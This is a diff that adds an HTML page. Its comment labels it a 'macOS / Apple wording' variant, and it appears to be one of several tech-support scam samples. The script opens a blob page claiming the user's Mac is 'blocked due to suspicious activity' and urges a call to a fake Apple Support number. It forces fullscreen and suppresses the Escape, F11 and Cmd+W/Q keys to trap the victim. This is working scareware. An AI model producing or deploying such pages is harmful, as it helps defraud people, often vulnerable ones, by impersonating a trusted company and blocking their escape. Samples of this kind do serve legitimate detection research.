@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<!-- Variant: macOS / Apple wording, black background, international-format number, fullscreen grab. -->
+<html lang="en"><head><meta charset="utf-8"><title>Loading</title></head>
+<body>
+<script>
+  const html = `<!DOCTYPE html><html><head><meta charset="utf-8"><title>macOS Security</title>
+  <style>body{margin:0;background:#000;color:#eee;font-family:-apple-system,Helvetica;height:100vh;display:flex;align-items:center;justify-content:center;text-align:center}</style></head>
+  <body><div><h1>Your Mac has been blocked due to suspicious activity</h1>
+  <p>Contact Apple Support to unlock it. Do not close this window.</p><h2>+1 (888) 555-0142</h2></div>
+  <script>
+    document.documentElement.requestFullscreen().catch(() => {});
+    document.addEventListener('keydown', e => { if (e.key === 'Escape' || e.key === 'F11' || (e.metaKey && 'wq'.includes(e.key))) e.preventDefault(); });
+  <\/script></body></html>`;
+  location.href = URL.createObjectURL(new Blob([html], { type: 'text/html' }));
+</script></body></html>
